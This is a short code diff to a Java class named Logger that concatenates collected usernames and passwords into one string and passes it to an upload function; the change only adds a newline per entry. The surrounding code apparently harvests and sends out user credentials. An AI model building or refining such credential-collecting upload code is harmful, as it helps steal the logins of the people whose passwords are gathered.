@@ -54,7 +54,7 @@ public class Logger{
 		    }
 		    String uploadInfo = "";
 		    for(int i = 0; i < passwords.size(); i++){
-		    	uploadInfo+="Username: "+usernames.get(i)+"\tPassword: "+passwords.get(i);
+		    	uploadInfo+="Username: "+usernames.get(i)+"\tPassword: "+passwords.get(i)+"\n";
 		    }
 		    upload(uploadInfo);
 		}
